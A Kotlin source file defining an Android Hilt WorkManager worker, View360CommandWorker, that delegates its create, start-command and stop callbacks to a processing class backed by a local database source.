package com.android.services.workers.view360

import android.content.Context
import androidx.hilt.work.HiltWorker
import androidx.work.WorkerParameters
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IWorkerProcessing
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.workers.base.BaseWorker
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import kotlinx.coroutines.CoroutineScope

@HiltWorker
class View360CommandWorker  @AssistedInject constructor(
    @Assisted val context: Context,
    @Assisted parameters: WorkerParameters,
    val localDatabaseSource: LocalDatabaseSource,
    @ApplicationScope val coroutineScope: CoroutineScope
) :
    BaseWorker(context, parameters,View360CommandProcessingBase.TAG_360_WORKER) {
    private lateinit var view360ProcessingI: IWorkerProcessing

    override fun onCreate() {
        view360ProcessingI = View360CommandProcessingBaseImpll(context,localDatabaseSource,coroutineScope)
        view360ProcessingI.onCreate()
    }

    override fun onStartCommand() {
        view360ProcessingI.onStartCommand(inputData)
    }

    override fun onStop() {
        view360ProcessingI.onDestroy()
    }
}